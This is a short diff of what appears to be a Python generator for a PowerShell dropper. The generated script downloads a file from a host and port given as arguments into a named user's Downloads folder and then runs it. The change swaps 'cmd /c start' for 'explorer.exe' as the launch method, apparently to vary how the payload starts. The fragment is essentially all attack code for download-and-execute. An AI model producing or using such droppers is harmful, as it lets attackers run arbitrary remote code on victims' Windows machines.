@@ -16,7 +16,7 @@ $client = New-Object System.Net.WebClient
 $dlname = [uri]::EscapeDataString($filename)
 $client.DownloadFile("http://{0}:{1}/$dldir/$dlname", "C:\\Users\\James\\Downloads\\$filename")
 
-cmd /c start "C:\\Users\\James\\Downloads\\$filename" """.format(sys.argv[1], sys.argv[2])
+explorer.exe "C:\\Users\\James\\Downloads\\$filename" """.format(sys.argv[1], sys.argv[2])
 
 with open(sys.argv[3], 'w') as f:
 	f.write(content)
